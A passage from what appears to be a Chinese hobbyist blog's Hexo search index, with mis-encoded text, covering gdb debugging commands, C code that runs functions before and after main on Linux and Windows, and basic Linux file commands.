class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">b è¡Œå·ï¼šæ‰“æ–­ç‚¹</span><br><span class="line">info bï¼šæŸ¥çœ‹æ–­ç‚¹</span><br><span class="line">d æ–­ç‚¹ç¼–å·ï¼š å–æ¶ˆæ–­ç‚¹</span><br><span class="line">l è¡Œå·ï¼šæ˜¾ç¤ºä»£ç </span><br><span class="line">l mainï¼šæ˜¾ç¤ºåŒ…å«mainçš„é‚£ä¸€è¡Œ</span><br><span class="line">rï¼šrunï¼Œå¼€å§‹è¿è¡Œç¨‹åº,è·³åˆ°ç¬¬ä¸€ä¸ªæ–­ç‚¹</span><br><span class="line">sï¼šstepï¼Œé€è¯­å¥ï¼Œå¯¹åº”vsçš„F11ï¼ˆè¿›å…¥å‡½æ•°ï¼‰</span><br><span class="line">nï¼šnextï¼Œé€è¿‡ç¨‹ï¼Œå¯¹åº”vsçš„F10</span><br><span class="line">cï¼šcontinueï¼Œè·³è½¬é“ä¸‹ä¸€ä¸ªæ–­ç‚¹</span><br><span class="line">pï¼šæŸ¥çœ‹å˜é‡</span><br><span class="line">display / undisplayï¼šå¸¸æ˜¾ç¤º æˆ– å–æ¶ˆå¸¸æ˜¾ç¤º</span><br><span class="line">until è¡Œå·ï¼šè·³è½¬åˆ°æŒ‡å®šè¡Œ</span><br><span class="line">finishï¼šæ‰§è¡Œå®Œä¸€ä¸ªå‡½æ•°ååœä¸‹</span><br><span class="line">btï¼šæŸ¥çœ‹å‡½æ•°è°ƒç”¨å †æ ˆ</span><br></pre></td></tr></table></figure><h2 id="åœ¨mainä¹‹å‰æ‰§è¡Œå‡½æ•°"><a href="#åœ¨mainä¹‹å‰æ‰§è¡Œå‡½æ•°" class="headerlink" title="åœ¨mainä¹‹å‰æ‰§è¡Œå‡½æ•°"></a>åœ¨mainä¹‹å‰æ‰§è¡Œå‡½æ•°</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> __attribute((constructor)) void before_main()</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;before main!\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">__attribute((destructor)) void after_main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;after main!\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">   printf(&quot;This is main function.\n&quot;);</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="win"><a href="#win" class="headerlink" title="win"></a>win</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int before_main(void)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;before main!\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int after_main(void)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;after main!\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">typedef int func();</span><br><span class="line"></span><br><span class="line">#pragma data_seg(&quot;.CRT$XIU&quot;)</span><br><span class="line">static func* before[] = &#123; before_main &#125;;</span><br><span class="line">#pragma data_seg(&quot;.CRT$XPU&quot;)</span><br><span class="line">static func* after[] = &#123; after_main &#125;;</span><br><span class="line">#pragma data_seg()</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;This is main function.&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxå¸¸ç”¨æŒ‡ä»¤</title>
      <link href="/posts/21894/"/>
      <url>/posts/21894/</url>
      
        <content type="html"><![CDATA[<h1 id="Linuxå¸¸ç”¨æŒ‡ä»¤"><a href="#Linuxå¸¸ç”¨æŒ‡ä»¤" class="headerlink" title="Linuxå¸¸ç”¨æŒ‡ä»¤"></a>Linuxå¸¸ç”¨æŒ‡ä»¤</h1><h2 id="cd-ç›®å½•åˆ‡æ¢"><a href="#cd-ç›®å½•åˆ‡æ¢" class="headerlink" title="cd ç›®å½•åˆ‡æ¢"></a>cd ç›®å½•åˆ‡æ¢</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd / #æ ¹ç›®å½•</span><br><span class="line">cd /home #homeç›®å½•</span><br></pre></td></tr></table></figure><h2 id="mkdir-åˆ›å»ºç©ºç›®å½•"><a href="#mkdir-åˆ›å»ºç©ºç›®å½•" class="headerlink" title="mkdir åˆ›å»ºç©ºç›®å½•"></a>mkdir åˆ›å»ºç©ºç›®å½•</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir test1 #åˆ›å»ºtest1ç›®å½•</span><br></pre></td></tr></table></figure><h2 id="rmdir-åˆ é™¤ç©ºç›®å½•"><a href="#rmdir-åˆ é™¤ç©ºç›®å½•" class="headerlink" title="rmdir åˆ é™¤ç©ºç›®å½•"></a>rmdir åˆ é™¤ç©ºç›®å½•</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmdir test1 #åˆ é™¤test1ç›®å½•</span><br></pre></td></tr></table></figure><h2 id="cp-å¤åˆ¶"><a href="#cp-å¤åˆ¶" class="headerlink" title="cp å¤åˆ¶"></a>cp å¤åˆ¶</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp 1.txt /test1 #å°†1.txtå¤åˆ¶åˆ°test1ç›®å½•</span><br></pre></td></tr></table></figure><h2 id="mv-ç§»åŠ¨-amp-é‡å‘½å"><a href="#mv-ç§»åŠ¨-amp-é‡å‘½å" class="headerlink" title="mv ç§»åŠ¨&amp;é‡å‘½å"></a>mv ç§»åŠ¨&amp;é‡å‘½å</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv 1.txt /test1 #å°†1.txtç§»åŠ¨åˆ°test1ç›®å½•</span><br><span class="line">mv test1 test2 #å°†test1é‡å‘½åtest2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<p>èœèœèœèœèœèœèœèœèœèœèœèœèœèœèœèœé¸¡Pwnæ‰‹</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>link</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
